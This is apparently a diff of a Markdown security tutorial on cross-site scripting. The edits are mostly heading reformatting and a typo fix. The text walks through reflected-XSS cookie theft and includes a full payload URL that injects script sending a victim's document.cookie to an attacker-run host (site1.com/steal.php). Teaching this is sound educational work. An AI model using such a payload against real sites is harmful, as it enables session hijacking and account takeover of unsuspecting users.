@@ -1,4 +1,4 @@
-#### What Can Attacker Do With The XSS ?
+## **What Can Attacker Do With The XSS ?**
 
 **Cross site scripting attacks can be used to achieve many goals**
 
@@ -7,12 +7,11 @@
 - **Initiating an exploitation phase against browser plugins first and then the machine**
 - **Perfom keylogging**
 
-#### Stealing Cokkie With XSS Sample
+## **Stealing Cokkie With XSS Sample**
 
 **Lets assume that the ultimate goal of an hacker is to run JavaScript to steal a sesion cookie of a user John Doe who is authenticated into web site site2.com**\
-
 **The first thing the hacker tries to do is to find an XSSvulnerability affecting website**\
-**Once an XS is located , attacker will have to build up a payload, create link and sent it to victim inviting the same to click on it. (This is called refleccted xss)**
+**Once an XSS is located , attacker will have to build up a payload, create link and sent it to victim inviting the same to click on it. (This is called refleccted xss)**
 
 `http://site2.com/vulnerablexss.php?name=<script>var i=new Image(); i.src="http://site1.com/steal.php?q="%2bdocument.cookie;</script>`
 
